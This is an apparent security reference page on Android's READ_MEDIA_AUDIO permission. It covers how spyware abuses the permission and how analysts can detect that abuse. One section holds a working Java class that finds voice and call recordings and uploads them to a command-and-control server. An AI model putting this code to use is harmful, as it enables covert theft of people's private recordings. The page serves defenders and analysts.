# READ_MEDIA_AUDIO

Allows reading audio files (music, voice recordings, podcasts) from shared storage via `MediaStore`. Granular media permission introduced in Android 13.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.READ_MEDIA_AUDIO` |
| Protection Level | `dangerous` |
| Permission Group | `READ_MEDIA_AURAL` |
| Grant Method | Runtime permission dialog |
| Introduced | API 33 (Android 13) |

## What It Enables

Query `MediaStore.Audio` for all audio files on the device.

## Abuse in Malware

### Voice Recording Exfiltration

Users may have voice recordings (meetings, notes, interviews) stored on their device. These can contain sensitive information.

### Call Recording Access

Third-party call recording apps store recordings as audio files in shared storage. Accessible through this permission.

### Abuse Code Example

```java
public class AudioExfiltrator {

    private final ContentResolver resolver;
    private final String c2Url;

    public AudioExfiltrator(ContentResolver resolver, String c2Url) {
        this.resolver = resolver;
        this.c2Url = c2Url;
    }

    public void exfiltrateRecordings() {
        String[] projection = {
            MediaStore.Audio.Media._ID,
            MediaStore.Audio.Media.DISPLAY_NAME,
            MediaStore.Audio.Media.DATE_ADDED,
            MediaStore.Audio.Media.SIZE,
            MediaStore.Audio.Media.MIME_TYPE
        };

        String selection = MediaStore.Audio.Media.MIME_TYPE + " IN (?, ?, ?)";
        String[] selectionArgs = {"audio/amr", "audio/3gpp", "audio/mp4"};

        Cursor cursor = resolver.query(
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            MediaStore.Audio.Media.DATE_ADDED + " DESC"
        );

        if (cursor == null) return;

        while (cursor.moveToNext()) {
            long id = cursor.getLong(0);
            String name = cursor.getString(1);
            long size = cursor.getLong(3);

            Uri contentUri = ContentUris.withAppendedId(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, id
            );
            uploadToC2(contentUri, name, size);
        }
        cursor.close();
    }

    private void uploadToC2(Uri uri, String name, long size) {
        try (InputStream is = resolver.openInputStream(uri)) {
            byte[] data = new byte[(int) size];
            is.read(data);
            HttpURLConnection conn = (HttpURLConnection)
                new URL(c2Url + "/upload").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("X-Filename", name);
            conn.getOutputStream().write(data);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
        }
    }
}
```

The malware filters for recording-type MIME types (AMR, 3GPP, MP4 audio) to prioritize voice recordings over music. Sorting by `DATE_ADDED` descending ensures the most recent recordings are exfiltrated first.

### Stalkerware and Spyware

This permission is primarily abused by stalkerware and general-purpose spyware. These families run as persistent background services and periodically query `MediaStore.Audio` for newly added recordings, uploading them to operator-controlled servers. Voice memos, interviews, and ambient recordings are high-value targets for surveillance operators.

## Android Version Changes

**Android 13 (API 33)**: `READ_MEDIA_AUDIO` introduced as a replacement for `READ_EXTERNAL_STORAGE` for audio file access. Apps targeting API 33+ must request this specific permission instead of the broader storage permission.

**Android 14 (API 34)**: no photo picker equivalent for audio, so the permission model remains unchanged. Audio files continue to require full `READ_MEDIA_AUDIO` access.

**Pre-Android 13**: apps use `READ_EXTERNAL_STORAGE` to access all media types including audio. The broader permission makes it harder to identify audio-specific abuse.

## Detection

In the manifest:

```xml
<uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
```

Expected in music players, podcast apps, and voice recording apps.

### Analysis Indicators

- Look for `MediaStore.Audio` queries filtered to recording MIME types (AMR, 3GPP) rather than music formats (MP3, FLAC). Music players query broadly; spyware filters for voice recordings.
- Check for periodic background queries using `AlarmManager` or `WorkManager` to detect new audio files.
- Network traffic containing audio file uploads, especially to non-CDN endpoints, indicates exfiltration.
- Apps combining `READ_MEDIA_AUDIO` with `INTERNET` and `FOREGROUND_SERVICE` but lacking any audio playback UI are suspicious.
